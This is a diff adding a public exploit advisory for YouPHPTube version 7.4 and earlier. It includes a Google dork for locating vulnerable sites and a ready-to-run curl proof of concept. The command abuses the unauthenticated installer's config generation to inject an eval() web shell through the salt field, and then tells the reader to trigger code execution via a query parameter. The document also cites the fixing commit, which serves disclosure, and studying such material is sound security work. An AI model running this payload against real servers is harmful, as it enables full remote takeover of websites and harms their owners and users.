@@ -1,0 +1,23 @@
+# Exploit Title: YouPHPTube <= 7.4 - Remote Code Execution
+# Google Dork: intext:"Powered by YouPHPTube"
+# Date: 29 August 2019
+# Exploit Author: Damian Ebelties (https://zerodays.lol/)
+# Vendor Homepage: https://www.youphptube.com/
+# Version: <= 7.4
+# Tested on: Ubuntu 18.04.1
+
+YouPHPTube before 7.5 does no checks at all if you wanna generate a new
+config file. We can use this to generate our own config file with our
+own (malicious) code.
+
+All you need is a MySQL server that allows remote connections.
+
+Fixed by the following commit:
+
+    https://github.com/YouPHPTube/YouPHPTube/commit/b32b410c9191c3c5db888514c29d7921f124d883
+
+Proof-of-Concept:
+
+    # Run this command (with your own data replaced)
+    # Then visit https://domain.tld/?zerodayslol=phpinfo() for code execution!
+    curl -s "https://domain.tld/install/checkConfiguration.php" --data "contactEmail=rce@zerodays.lol&createTables=2&mainLanguage=RCE&salt=';eval(\$_REQUEST['zerodayslol']);echo '&systemAdminPass=zerodays.LOL&systemRootPath=./&webSiteRootURL=<URL>&webSiteTitle=Zerodays.lol&databaseHost=<DB_HOST>&databaseName=<DB_NAME>&databasePass=<DB_PASS>&databasePort=<DB_PORT>&databaseUser=<DB_USER>"
